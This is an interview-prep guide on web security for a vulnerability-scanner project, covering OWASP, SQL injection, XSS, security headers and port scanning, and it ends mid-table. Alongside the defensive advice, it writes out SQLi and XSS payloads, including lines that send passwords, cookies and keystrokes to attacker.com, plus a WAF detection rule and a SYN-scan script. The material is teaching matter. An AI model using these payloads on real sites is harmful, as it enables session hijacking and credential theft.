# 🎯 Web Vulnerability Scanner - Interview Questions & Expert Solutions

> **For TCS HackQuest Season 10 & Cybersecurity Interviews**
> In-depth technical answers from a security engineering perspective

---

## Table of Contents
1. [Web Security Fundamentals](#1-web-security-fundamentals)
2. [SQL Injection (SQLi)](#2-sql-injection-sqli)
3. [Cross-Site Scripting (XSS)](#3-cross-site-scripting-xss)
4. [HTTP Security Headers](#4-http-security-headers)
5. [Port Scanning & Network Security](#5-port-scanning--network-security)
6. [Directory Enumeration](#6-directory-enumeration)
7. [Architecture & Design Decisions](#7-architecture--design-decisions)
8. [Python & FastAPI Implementation](#8-python--fastapi-implementation)
9. [React & Frontend Security](#9-react--frontend-security)
10. [Advanced Topics](#10-advanced-topics)

---

## 1. Web Security Fundamentals

### Q1.1: What is the OWASP Top 10 and why is it important?

**Answer:**

The OWASP Top 10 is a standard awareness document representing a broad consensus about the most critical security risks to web applications. Updated every 3-4 years by the Open Web Application Security Project.

**OWASP Top 10 (2021):**

1. **A01:2021 – Broken Access Control** (moved from #5)
   - Users can act outside intended permissions
   - Example: Accessing `/admin` without authentication
   - Mitigation: Implement proper RBAC, deny by default

2. **A02:2021 – Cryptographic Failures** (previously Sensitive Data Exposure)
   - Exposure of sensitive data due to weak crypto
   - Example: Storing passwords in plaintext
   - Mitigation: Use bcrypt/Argon2 for passwords, TLS 1.3, proper key management

3. **A03:2021 – Injection** (down from #1)
   - SQL, NoSQL, OS command injection
   - Example: `SELECT * FROM users WHERE id = '$id'` with unsanitized input
   - Mitigation: Parameterized queries, ORMs, input validation

4. **A04:2021 – Insecure Design**
   - Missing or ineffective security controls
   - Example: No rate limiting on password reset
   - Mitigation: Threat modeling, secure design patterns

5. **A05:2021 – Security Misconfiguration**
   - Default credentials, verbose errors, unnecessary features enabled
   - Example: Debug mode in production
   - Mitigation: Security hardening, minimal attack surface

6. **A06:2021 – Vulnerable and Outdated Components**
   - Using libraries with known vulnerabilities
   - Example: Using `requests==2.0.0` (CVE-2018-18074)
   - Mitigation: Dependency scanning, regular updates

7. **A07:2021 – Identification and Authentication Failures**
   - Broken session management
   - Example: Session IDs in URLs
   - Mitigation: MFA, secure session tokens, credential stuffing protection

8. **A08:2021 – Software and Data Integrity Failures**
   - Code/infrastructure without integrity verification
   - Example: Supply chain attacks (SolarWinds)
   - Mitigation: Code signing, SRI for CDN resources

9. **A09:2021 – Security Logging and Monitoring Failures**
   - Insufficient logging/alerting
   - Example: No alerting on repeated login failures
   - Mitigation: SIEM, real-time monitoring, audit logs

10. **A10:2021 – Server-Side Request Forgery (SSRF)**
    - Fetching remote resources without validation
    - Example: `fetch(user_provided_url)`
    - Mitigation: Whitelist URLs, disable redirects, network segmentation

**Why Important:**
- Industry standard for risk prioritization
- Guides penetration testing scope
- Compliance requirements (PCI-DSS references OWASP)
- Interview gold standard

---

### Q1.2: Explain the CIA Triad in cybersecurity

**Answer:**

The CIA Triad is the foundational model for information security:

**1. Confidentiality**
- **Definition**: Preventing unauthorized access to information
- **Techniques**:
  - Encryption (AES-256, RSA)
  - Access control (ACLs, RBAC)
  - Authentication (passwords, biometrics)
- **Real-world example**: TLS encrypts data in transit, so MITM attackers can't read it
- **Project application**: SSRF prevention in `helpers.py` prevents internal data leakage

**2. Integrity**
- **Definition**: Ensuring data hasn't been tampered with
- **Techniques**:
  - Hashing (SHA-256)
  - Digital signatures (RSA, ECDSA)
  - Checksums
  - Version control
- **Real-world example**: Git commits use SHA-1 hashes to detect tampering
- **Project application**: Validating scan results haven't been modified before PDF export

**3. Availability**
- **Definition**: Ensuring systems are accessible when needed
- **Techniques**:
  - Redundancy (load balancers, failover)
  - DDoS protection (rate limiting, CDN)
  - Backups (3-2-1 rule)
  - Disaster recovery
- **Real-world example**: Cloudflare CDN protects against DDoS
- **Project application**: Request timeouts prevent hung connections from blocking server

**Trade-offs:**
- High confidentiality (encryption) can impact availability (slower)
- High availability (caching) can impact integrity (stale data)
- Balance based on asset criticality

---

## 2. SQL Injection (SQLi)

### Q2.1: Explain SQL Injection in depth. How does it work, and what are the different types?

**Answer:**

**SQL Injection Fundamentals:**

SQL Injection occurs when untrusted user input is concatenated into SQL queries without proper sanitization, allowing attackers to manipulate the query logic.

**Vulnerable Code Example:**
```python
# VULNERABLE
user_id = request.args.get('id')
query = f"SELECT * FROM users WHERE id = {user_id}"
cursor.execute(query)
```

**Attack:**
```
Input: 1 OR 1=1
Query becomes: SELECT * FROM users WHERE id = 1 OR 1=1
Result: Returns ALL users (1=1 is always true)
```

---

**Types of SQL Injection:**

**1. Error-Based SQLi**
- Exploits database error messages
- Example payload: `' OR 1=1--`
- Backend generates: `SELECT * FROM users WHERE username = '' OR 1=1--' AND password = '...'`
- The `--` comments out the rest
- **Detection**: Look for SQL errors in response

**2. Union-Based SQLi**
- Uses UNION to combine results from multiple SELECT statements
- Example: `' UNION SELECT username, password FROM admin_users--`
- Requirements: Same number of columns, compatible data types
- **Technique**:
  ```sql
  ' UNION SELECT NULL, NULL, NULL-- (find column count)
  ' UNION SELECT 1,2,3-- (identify which columns display)
  ' UNION SELECT table_name, NULL, NULL FROM information_schema.tables--
  ```

**3. Boolean-Based Blind SQLi**
- No error messages, infer data based on true/false responses
- Example:
  ```
  ' AND 1=1-- (page loads normally → TRUE)
  ' AND 1=2-- (page behaves differently → FALSE)
  ' AND SUBSTRING(password,1,1)='a'-- (brute force each character)
  ```

**4. Time-Based Blind SQLi**
- Use database sleep functions
- Example (MySQL):
  ```sql
  ' AND IF(1=1, SLEEP(5), 0)-- (delay confirms injection)
  ' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)--
  ```
- PostgreSQL: `pg_sleep(5)`
- MSSQL: `WAITFOR DELAY '00:00:05'`

**5. Second-Order SQLi**
- Payload stored in database, executed later
- Example:
  1. Register username: `admin'--`
  2. Later, app uses this in query: `UPDATE users SET email='...' WHERE username='admin'--'`
  3. Comments out WHERE clause

**6. Out-of-Band SQLi**
- Data exfiltrated via DNS or HTTP requests
- Example (MSSQL):
  ```sql
  '; EXEC xp_dirtree '\\\\' + (SELECT password FROM users WHERE id=1) + '.attacker.com\\share'--
  ```
- Requires database server to make outbound requests

---

**Our Scanner's Detection Logic (`sqli.py`):**

```python
SQL_PAYLOADS = [
    "' OR '1'='1",           # Basic bypass
    "' OR 1=1--",            # Comment-based
    "admin'--",              # Comment admin
    "' UNION SELECT NULL--", # Union detection
    "1' AND '1'='2",         # Boolean false
    "' AND SLEEP(5)--",      # Time-based
]

ERROR_PATTERNS = [
    "sql syntax", "mysql_fetch", "ora-", "postgresql",
    "sqlite_", "unclosed quotation"
]
```

**Detection Strategy:**
1. Inject payload into form fields/URL params
2. Submit request
3. Check response for:
   - SQL error keywords
   - Different response length
   - Time delays
4. If detected, mark as vulnerable with evidence

---

### Q2.2: How would you prevent SQL Injection in a real application?

**Answer:**

**Defense in Depth Approach:**

**1. Primary Defense: Parameterized Queries (Prepared Statements)**

**Python (psycopg2):**
```python
# SECURE
cursor.execute(
    "SELECT * FROM users WHERE id = %s AND status = %s",
    (user_id, status)
)
```

**How it works:**
- Query structure is sent to DB separately from data
- Database knows `%s` is data, not SQL code
- Driver automatically escapes special characters
- **Cannot be bypassed**

**Node.js (mysql2):**
```javascript
connection.execute(
    'SELECT * FROM users WHERE id = ? AND email = ?',
    [userId, email]
)
```

**2. Use ORMs (Object-Relational Mappers)**

**SQLAlchemy (Python):**
```python
# SECURE
from sqlalchemy import select
stmt = select(User).where(User.id == user_id)
result = session.execute(stmt)
```

**Django ORM:**
```python
User.objects.filter(id=user_id)  # Automatically parameterized
```

**Advantage**: ORM abstracts SQL, less prone to injection

**3. Input Validation**

```python
# Whitelist validation
def validate_user_id(user_id):
    if not user_id.isdigit():
        raise ValueError("Invalid ID")
    if int(user_id) < 1 or int(user_id) > 1000000:
        raise ValueError("ID out of range")
    return int(user_id)

# Escape special characters (secondary defense)
import html
safe_input = html.escape(user_input)
```

**4. Principle of Least Privilege**

```sql
-- Create app user with minimal permissions
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strong_password';
GRANT SELECT, INSERT, UPDATE ON app_db.* TO 'webapp'@'localhost';
-- NO DELETE, DROP, CREATE permissions

-- Even if SQLi occurs, attacker can't DROP TABLE
```

**5. Web Application Firewall (WAF)**

```nginx
# ModSecurity rule
SecRule ARGS "@rx (?i:union.*select|sleep\(|benchmark\()" \
    "id:1000,phase:2,deny,status:403,msg:'SQL Injection Attempt'"
```

**6. Stored Procedures (with caution)**

```sql
DELIMITER //
CREATE PROCEDURE GetUser(IN userId INT)
BEGIN
    SELECT * FROM users WHERE id = userId;
END //
DELIMITER ;
```

Call from Python:
```python
cursor.callproc('GetUser', [user_id])
```

**Warning**: Stored procedures are NOT immune if dynamic SQL is used inside them

**7. Error Handling**

```python
try:
    cursor.execute(query)
except Exception as e:
    # DON'T expose raw error to user
    logger.error(f"Database error: {e}")
    return {"error": "An error occurred. Please try again."}
```

**8. Security Headers**

```python
# Content-Security-Policy prevents data exfiltration
response.headers['Content-Security-Policy'] = "default-src 'self'"
```

---

### Q2.3: In your scanner, how do you test for SQL injection without causing damage?

**Answer:**

**Ethical Testing Principles:**

**1. Non-Destructive Payloads**

We use **read-only** payloads that don't modify data:

```python
SQL_PAYLOADS = [
    "' OR '1'='1",      # Boolean logic (read-only)
    "' OR 1=1--",       # Comment-based (read-only)
    "1' AND '1'='2",    # Boolean false (read-only)
]

# NEVER use:
# "'; DROP TABLE users--"  # Destructive
# "'; UPDATE users SET role='admin'--"  # Modifies data
```

**2. Time-Based Testing (Careful)**

```python
"' AND SLEEP(5)--"  # MySQL
```

**Pro**: Confirms blind SQLi without data leakage
**Con**: Can cause DoS if SLEEP is in loop
**Mitigation**: Use short sleep times (2-3 seconds max), rate limit tests

**3. Error-Based Detection**

```python
ERROR_PATTERNS = [
    r"sql syntax",
    r"mysql_fetch",
    r"unclosed quotation",
    r"sqlite_",
]

# Detect presence of vulnerability without exploiting
for error_pattern in ERROR_PATTERNS:
    if re.search(error_pattern, response.text, re.IGNORECASE):
        return True
```

**4. Authorization & Scope**

```python
def is_safe_url(url):
    \"\"\"SSRF prevention - only scan what you're authorized to\"\"\"
    parsed = urlparse(url)
    
    # Block internal IPs
    if parsed.hostname in ['localhost', '127.0.0.1']:
        return False, "Local URLs not allowed"
    
    # Block private ranges
    if ipaddress.ip_address(parsed.hostname).is_private:
        return False, "Private IP ranges not allowed"
    
    return True, "OK"
```

**5. Rate Limiting**

```python
# Prevent DoS from scanning
time.sleep(0.5)  # 500ms delay between requests
```

**6. Logging & Transparency**

```python
logger.info(f"Testing URL: {url} with payload: {payload}")
# Maintain audit trail
# Show user exactly what's being tested
```

**7. Target Consent**

Always scan:
- Your own applications (development/staging)
- Bug bounty programs (HackerOne, Bugcrowd)
- Penetration testing contracts

Never scan without written authorization.

---

## 3. Cross-Site Scripting (XSS)

### Q3.1: Explain XSS types and how they differ. Provide attack scenarios.

**Answer:**

**Cross-Site Scripting (XSS)** allows attackers to inject malicious JavaScript into web pages viewed by other users.

---

**Type 1: Reflected XSS (Non-Persistent)**

**Flow:**
1. Attacker crafts malicious URL
2. Victim clicks link
3. Server reflects payload in response
4. Browser executes script

**Example:**

Vulnerable search page:
```python
# Vulnerable Flask code
@app.route('/search')
def search():
    query = request.args.get('q')
    return f"<h1>Results for: {query}</h1>"
```

**Attack:**
```
https://victim.com/search?q=<script>alert(document.cookie)</script>
```

**Rendered HTML:**
```html
<h1>Results for: <script>alert(document.cookie)</script></h1>
```

**Impact**: Script executes in victim's browser, can steal cookies, session tokens

**Real-world scenario:**
```javascript
// Steal session cookie and send to attacker
<script>
fetch('https://attacker.com/steal?cookie=' + document.cookie)
</script>
```

---

**Type 2: Stored XSS (Persistent)**

**Flow:**
1. Attacker submits malicious data (comment, profile)
2. Data stored in database
3. All users who view the data execute the script

**Example:**

Comment feature:
```python
# Vulnerable code
comment = request.form.get('comment')
db.execute("INSERT INTO comments (text) VALUES (?)", (comment,))

# Display comments
for comment in db.execute("SELECT text FROM comments"):
    print(f"<p>{comment['text']}</p>")
```

**Attack:**
Attacker posts comment:
```html
Nice article! <script>
    // Keylogger
    document.onkeypress = function(e) {
        fetch('https://attacker.com/log?key=' + e.key)
    }
</script>
```

**Impact**: Every user viewing comments gets keylogged

---

**Type 3: DOM-Based XSS**

**Definition**: Vulnerability in client-side JavaScript, not server

**Example:**

```javascript
// Vulnerable code
let username = location.hash.substring(1);
document.getElementById('welcome').innerHTML = 'Hello ' + username;
```

**Attack:**
```
https://victim.com/profile#<img src=x onerror=alert(1)>
```

**Flow:**
1. No server interaction
2. JavaScript reads `location.hash`
3. Unsafely inserts into DOM
4. Browser executes `onerror`

**Advanced DOM XSS:**
```javascript
// Vulnerable
eval(location.hash.substring(1));

// Attack URL
https://victim.com#document.location='https://attacker.com/steal?cookie='+document.cookie
```

---

**Our Scanner's XSS Detection (`xss.py`):**

```python
XSS_PAYLOADS = [
    '<script>alert(1)</script>',           # Basic
    '<img src=x onerror=alert(1)>',        # Event handler
    '"><script>alert(1)</script>',         # Break attribute
    '<svg/onload=alert(1)>',               # SVG
    'javascript:alert(1)',                 # Protocol handler
    '<iframe src=javascript:alert(1)>',    # Iframe
    '<body onload=alert(1)>',              # Body event
]

def check_xss_reflection(response_text, payload):
    # Check if payload appears unescaped
    return payload in response_text
```

**Detection Strategy:**
1. Inject XSS payload into input fields
2. Submit form/request
3. Check if payload appears in response **unescaped**
4. If found, vulnerability confirmed

---

### Q3.2: How do you prevent XSS? What's the difference between encoding, escaping, and sanitization?

**Answer:**

**Defense in Depth:**

**1. Output Encoding (Context-Aware)**

**HTML Context:**
```python
import html
safe_output = html.escape(user_input)
# Converts: < > & " ' → &lt; &gt; &amp; &quot; &#x27;
```

**JavaScript Context:**
```javascript
// Bad
let user = "<?= $user_input ?>";

// Good - use JSON encoding
let user = <?= json_encode($user_input) ?>;
```

**URL Context:**
```python
from urllib.parse import quote
safe_url = f"https://example.com/search?q={quote(user_input)}"
```

**CSS Context:**
```python
# Avoid user input in CSS entirely
# If necessary, whitelist valid values
valid_colors = ['red', 'blue', 'green']
if user_color in valid_colors:
    style = f"color: {user_color}"
```

---

**2. Content Security Policy (CSP)**

```python
# FastAPI
@app.middleware("http")
async def add_security_headers(request, call_next):
    response = await call_next(request)
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self' https://trusted-cdn.com; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data: https:; "
        "font-src 'self'; "
        "connect-src 'self'; "
        "frame-ancestors 'none';"
    )
    return response
```

**CSP Directives Explained:**
- `default-src 'self'`: Only load resources from same origin
- `script-src 'self'`: Only scripts from same origin (blocks inline `<script>`)
- `style-src 'unsafe-inline'`: Allow inline styles (use sparingly)
- `frame-ancestors 'none'`: Prevent clickjacking

**Nonce-based CSP (strongest):**
```html
<!-- Server generates random nonce -->
<meta http-equiv="Content-Security-Policy" 
      content="script-src 'nonce-r4nd0m123'">

<!-- Only scripts with matching nonce execute -->
<script nonce="r4nd0m123">
    // This runs
</script>

<script>
    // This is blocked (no nonce)
</script>
```

---

**3. React's Built-in Protection**

```jsx
// React automatically escapes
function Welcome({ username }) {
    return <h1>Hello {username}</h1>;
    // If username = "<script>alert(1)</script>"
    // Renders as: Hello &lt;script&gt;alert(1)&lt;/script&gt;
}
```

**Dangerous exception:**
```jsx
// DANGEROUS - bypasses escaping
<div dangerouslySetInnerHTML={{__html: userInput}} />

// Safe alternative - use markdown library
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(markdown)}} />
```

---

**4. Input Validation (Defense in Depth)**

```python
import re

def validate_username(username):
    # Whitelist: only alphanumeric and underscore
    if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
        raise ValueError("Invalid username")
    return username

def validate_email(email):
    # Use validator library
    from email_validator import validate_email
    try:
        validate_email(email)
        return email
    except:
        raise ValueError("Invalid email")
```

**Important**: Validation is NOT a substitute for encoding. Always encode on output.

---

**5. HTTPOnly and Secure Cookies**

```python
# FastAPI
response.set_cookie(
    key="session_token",
    value=token,
    httponly=True,   # JavaScript can't access (prevents XSS cookie theft)
    secure=True,     # Only sent over HTTPS
    samesite='strict' # CSRF protection
)
```

```javascript
// In browser console
document.cookie  // HTTPOnly cookies won't appear
```

---

**Encoding vs Escaping vs Sanitization:**

| Term | Definition | Example | Use Case |
|------|------------|---------|----------|
| **Encoding** | Convert characters to safe representation | `<` → `&lt;` | Output to HTML |
| **Escaping** | Add escape character | `'` → `\'` | SQL, shell commands |
| **Sanitization** | Remove/filter dangerous content | Strip `<script>` tags | HTML purification |

```python
# Encoding
html.escape("<script>")  # &lt;script&gt;

# Escaping
"\\'OR\\'1\\'=\\'1"  # Backslash escapes

# Sanitization
import bleach
bleach.clean("<script>alert(1)</script><b>text</b>")
# Output: <b>text</b> (script removed, safe tags kept)
```

---

## 4. HTTP Security Headers

### Q4.1: Explain all major security headers and their importance

**Answer:**

**1. Content-Security-Policy (CSP)**

**Purpose**: Prevent XSS by controlling resource loading

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com
```

**Directives:**
- `default-src`: Fallback for other directives
- `script-src`: JavaScript sources
- `style-src`: CSS sources
- `img-src`: Image sources
- `connect-src`: AJAX/WebSocket/EventSource
- `font-src`: Font sources
- `frame-src`: iframe sources
- `media-src`: Audio/video sources

**Example Attack Blocked:**
```html
<!-- Attacker injects -->
<script src="https://evil.com/malware.js"></script>

<!-- CSP blocks it (not in whitelist) -->
Refused to load the script 'https://evil.com/malware.js' because it violates the following Content Security Policy directive: "script-src 'self'"
```

**Levels:**
- **CSP Level 1**: Basic whitelisting
- **CSP Level 2**: Nonces, hashes
- **CSP Level 3**: `strict-dynamic`, `script-src-elem`

---

**2. X-Frame-Options**

**Purpose**: Prevent clickjacking

```http
X-Frame-Options: DENY
```

**Values:**
- `DENY`: Cannot be framed at all
- `SAMEORIGIN`: Can be framed by same origin only
- `ALLOW-FROM https://trusted.com`: (deprecated, use CSP frame-ancestors)

**Clickjacking Attack:**
```html
<!-- Attacker's page -->
<iframe src="https://bank.com/transfer" style="opacity:0.1"></iframe>
<button style="position:absolute; top:100px">Click for prize!</button>

<!-- User thinks they're clicking prize button, actually clicking hidden iframe -->
```

**Modern alternative:**
```http
Content-Security-Policy: frame-ancestors 'none'
```

---

**3. Strict-Transport-Security (HSTS)**

**Purpose**: Force HTTPS, prevent protocol downgrade attacks

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

**Parameters:**
- `max-age=31536000`: Enforce HTTPS for 1 year
- `includeSubDomains`: Apply to all subdomains
- `preload`: Submit to HSTS preload list (browsers hardcode your domain as HTTPS-only)

**Attack Prevented (SSL Strip):**
```
1. User types: http://bank.com
2. Attacker intercepts, serves HTTP version
3. User's traffic is unencrypted

With HSTS:
1. Browser remembers "always HTTPS"
2. Automatically converts http:// to https://
3. Refuses non-HTTPS connection
```

**Preload submission**: https://hstspreload.org/

---

**4. X-Content-Type-Options**

**Purpose**: Prevent MIME sniffing

```http
X-Content-Type-Options: nosniff
```

**Attack (MIME Confusion):**
```
1. Attacker uploads image: evil.jpg
2. File contains: <script>alert(1)</script>
3. Without nosniff, browser might execute it as HTML
4. With nosniff, browser strictly respects Content-Type: image/jpeg
```

**Example:**
```python
# FastAPI
from fastapi.responses import FileResponse

@app.get("/download/{file}")
def download(file: str, response: Response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['Content-Type'] = 'application/pdf'
    return FileResponse(f"uploads/{file}")
```

---

**5. X-XSS-Protection**

**Purpose**: Enable browser's XSS filter (legacy)

```http
X-XSS-Protection: 1; mode=block
```

**Values:**
- `0`: Disable filter
- `1`: Enable filter (sanitize)
- `1; mode=block`: Enable filter (block page entirely)

**Note**: **Deprecated** - use CSP instead. Some browsers removed support due to vulnerabilities in the filter itself.

---

**6. Referrer-Policy**

**Purpose**: Control how much referrer information is sent

```http
Referrer-Policy: strict-origin-when-cross-origin
```

**Options:**
- `no-referrer`: Never send referrer
- `same-origin`: Send only for same-origin requests
- `strict-origin`: Send origin only (no path) for HTTPS→HTTPS
- `strict-origin-when-cross-origin`: Full URL for same-origin, origin only for cross-origin

**Privacy concern:**
```
User visits: https://mysite.com/user/123/private-documents
Clicks link to: https://external.com
Without policy, external.com sees: Referer: https://mysite.com/user/123/private-documents

With strict-origin-when-cross-origin:
Referer: https://mysite.com (path stripped)
```

---

**7. Permissions-Policy (formerly Feature-Policy)**

**Purpose**: Control browser features

```http
Permissions-Policy: geolocation=(), camera=(), microphone=(self)
```

**Features:**
- `geolocation`: GPS access
- `camera`: Webcam
- `microphone`: Mic
- `payment`: Payment API
- `usb`: WebUSB
- `autoplay`: Media autoplay

**Values:**
- `()`: Blocked for everyone
- `(self)`: Allowed for this origin only
- `(self "https://trusted.com")`: Allowed for self and trusted.com

**Example:**
```http
Permissions-Policy: camera=(), microphone=(), geolocation=(self)
```
This prevents third-party iframes from accessing camera/mic, allows own code to use geolocation.

---

**8. X-Permitted-Cross-Domain-Policies**

**Purpose**: Control cross-domain policy files (Flash/PDF)

```http
X-Permitted-Cross-Domain-Policies: none
```

**Legacy header** for Adobe Flash `crossdomain.xml`. Still relevant for PDFs.

---

**Our Scanner's Header Check (`headers.py`):**

```python
SECURITY_HEADERS = {
    'Content-Security-Policy': 'CSP missing',
    'X-Frame-Options': 'Clickjacking protection missing',
    'Strict-Transport-Security': 'HSTS missing',
    'X-Content-Type-Options': 'MIME sniffing protection missing',
    'Referrer-Policy': 'Referrer policy missing',
    'Permissions-Policy': 'Permissions policy missing',
}

missing_headers = []
for header, message in SECURITY_HEADERS.items():
    if header not in response.headers:
        missing_headers.append({
            'header': header,
            'issue': message,
            'severity': 'medium'
        })
```

---

### Q4.2: How would you implement security headers in production?

**Answer:**

**FastAPI Middleware Approach:**

```python
from fastapi import FastAPI
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.requests import Request
from starlette.responses import Response

class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        response = await call_next(request)
        
        # 1. Content Security Policy
        response.headers['Content-Security-Policy'] = (
            "default-src 'self'; "
            "script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; "
            "style-src 'self' 'unsafe-inline'; "
            "img-src 'self' data: https:; "
            "font-src 'self' data:; "
            "connect-src 'self'; "
            "frame-ancestors 'none'; "
            "base-uri 'self'; "
            "form-action 'self';"
        )
        
        # 2. Prevent clickjacking
        response.headers['X-Frame-Options'] = 'DENY'
        
        # 3. Force HTTPS (1 year, include subdomains)
        response.headers['Strict-Transport-Security'] = (
            'max-age=31536000; includeSubDomains; preload'
        )
        
        # 4. Prevent MIME sniffing
        response.headers['X-Content-Type-Options'] = 'nosniff'
        
        # 5. Referrer policy
        response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
        
        # 6. Permissions policy
        response.headers['Permissions-Policy'] = (
            'geolocation=(), camera=(), microphone=(), payment=()'
        )
        
        # 7. Remove server header (hide tech stack)
        response.headers.pop('Server', None)
        
        # 8. CORS (if needed)
        if request.method == "OPTIONS":
            response.headers['Access-Control-Allow-Origin'] = 'https://trusted-frontend.com'
            response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
            response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'
            response.headers['Access-Control-Max-Age'] = '86400'
        
        return response

app = FastAPI()
app.add_middleware(SecurityHeadersMiddleware)
```

---

**Nginx Reverse Proxy:**

```nginx
server {
    listen 443 ssl http2;
    server_name api.example.com;
    
    # SSL Configuration
    ssl_certificate /etc/letsencrypt/live/example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;
    
    # Security Headers
    add_header Content-Security-Policy "default-src 'self'; script-src 'self' https://cdn.example.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self'; frame-ancestors 'none';" always;
    add_header X-Frame-Options "DENY" always;
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Permissions-Policy "geolocation=(), camera=(), microphone=()" always;
    
    # Hide Nginx version
    server_tokens off;
    
    location / {
        proxy_pass http://127.0.0.1:8000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```

---

**React (Helmet):**

```jsx
import { Helmet } from 'react-helmet';

function App() {
    return (
        <>
            <Helmet>
                <meta http-equiv="Content-Security-Policy" 
                      content="default-src 'self'; script-src 'self' https://cdn.example.com" />
                <meta http-equiv="X-Content-Type-Options" content="nosniff" />
            </Helmet>
            {/* Rest of app */}
        </>
    );
}
```

**Note**: Server headers take precedence over meta tags. Use meta tags only if you can't control server.

---

**Testing Headers:**

```bash
# curl
curl -I https://api.example.com

# Online tools
https://securityheaders.com
https://observatory.mozilla.org
```

---

## 5. Port Scanning & Network Security

### Q5.1: Explain TCP vs UDP scanning. How does your async port scanner work?

**Answer:**

**TCP vs UDP:**

**TCP (Transmission Control Protocol)**
- **Connection-oriented**: 3-way handshake (SYN, SYN-ACK, ACK)
- **Reliable**: Guarantees delivery, order, error-checking
- **Use cases**: HTTP, HTTPS, SSH, FTP, SMTP

**TCP Scan Types:**

**1. TCP Connect Scan (Full Connection)**
```python
import socket

def tcp_connect_scan(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0  # 0 = success (port open)
    except:
        return False
```

**Pros**: Reliable, no special privileges needed
**Cons**: Logged by firewall, slower (full handshake)

---

**2. TCP SYN Scan (Half-Open/Stealth)** ⭐ Industry standard

**Flow:**
```
Scanner -> SYN -> Target
Target -> SYN-ACK -> Scanner (port open)
Scanner -> RST -> Target (abort connection)

OR

Target -> RST -> Scanner (port closed)
```

**Code (requires root):**
```python
from scapy.all import *

def syn_scan(host, port):
    # Send SYN packet
    response = sr1(IP(dst=host)/TCP(dport=port, flags="S"), timeout=1, verbose=0)
    
    if response and response.haslayer(TCP):
        if response[TCP].flags == 0x12:  # SYN-ACK
            # Send RST to close
            send(IP(dst=host)/TCP(dport=port, flags="R"), verbose=0)
            return True  # Port open
        elif response[TCP].flags == 0x14:  # RST-ACK
            return False  # Port closed
    return False  # Filtered or no response
```

**Advantages:**
- **Stealthier**: Connection never fully establishes
- **Faster**: No full TCP handshake
- **Less logged**: Some IDS don't log incomplete connections

**Disadvantages:**
- Requires raw socket access (root/admin)
- Can be detected by modern firewalls

---

**UDP (User Datagram Protocol)**
- **Connectionless**: No handshake
- **Unreliable**: No delivery guarantee
- **Use cases**: DNS, DHCP, SNMP, VoIP

**UDP Scan Challenge:**
- UDP doesn't respond to open ports
- Closed ports send ICMP Port Unreachable

**UDP Scan Code:**
```python
import socket

def udp_scan(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2)
    
    try:
        # Send empty packet
        sock.sendto(b'', (host, port))
        
        # Try to receive
        try:
            data, addr = sock.recvfrom(1024)
            return True  # Response = open
        except socket.timeout:
            return "open|filtered"  # No response = open or filtered
    except socket.error as e:
        if e.errno == 111:  # Connection refused (ICMP Port Unreachable)
            return False  # Closed
    finally:
        sock.close()
```

**Problem**: Firewalls often drop ICMP, making results unreliable.

---

**Our Async Port Scanner (`portscan.py`):**

```python
import asyncio
import socket

class PortScanner:
    def __init__(self, target_url: str):
        self.hostname = urlparse(target_url).hostname
        self.ports = [21, 22, 23, 25, 53, 80, 443, 3306, 3389, 5432, 6379, 8080, 8443]
    
    async def scan_port(self, port: int) -> dict:
        \"\"\"Async TCP connect scan for single port\"\"\"
        try:
            # Create connection with timeout
            _, writer = await asyncio.wait_for(
                asyncio.open_connection(self.hostname, port),
                timeout=2.0
            )
            writer.close()
            await writer.wait_closed()
            
            return {
                'port': port,
                'state': 'open',
                'service': self.get_service_name(port)
            }
        except (asyncio.TimeoutError, ConnectionRefusedError, OSError):
            return None
    
    async def scan(self) -> dict:
        \"\"\"Scan all ports concurrently\"\"\"
        # Create tasks for all ports
        tasks = [self.scan_port(port) for port in self.ports]
        
        # Run concurrently
        results = await asyncio.gather(*tasks)
        
        # Filter out None (closed ports)
        open_ports = [r for r in results if r is not None]
        
        return {
            'open_ports': len(open_ports),
            'scanned_ports': len(self.ports),
            'ports': open_ports
        }
```

**Why Async?**

**Synchronous (slow):**
```python
for port in ports:
    scan_port(port)  # Waits for timeout before moving to next
# 25 ports × 2s timeout = 50 seconds
```

**Asynchronous (fast):**
```python
tasks = [scan_port(port) for port in ports]
await asyncio.gather(*tasks)  # All run concurrently
# Total time = max timeout (2-3 seconds)
```

**Performance:**
- **Sync**: 25 ports × 2s = 50 seconds
- **Async**: 2-3 seconds total

---

### Q5.2: What are common port numbers and their services? How do you avoid detection?

**Answer:**

**Common Ports:**

| Port | Service | Protocol | Attack Surface |
|------|---------|----------|----------------|
| **20/21** | FTP | TCP | Anonymous login, cleartext passwords |
| **22** | SSH | TCP | Brute force, weak keys |
| **23** | Telnet | TCP | Cleartext everything (use SSH instead) |
| **25** | SMTP | TCP | Open relay, email spoofing |
| **53** | DNS | UDP/TCP | Zone transfer, DNS tunneling |
| **80** | HTTP | TCP | Web vulnerabilities (SQLi, XSS) |
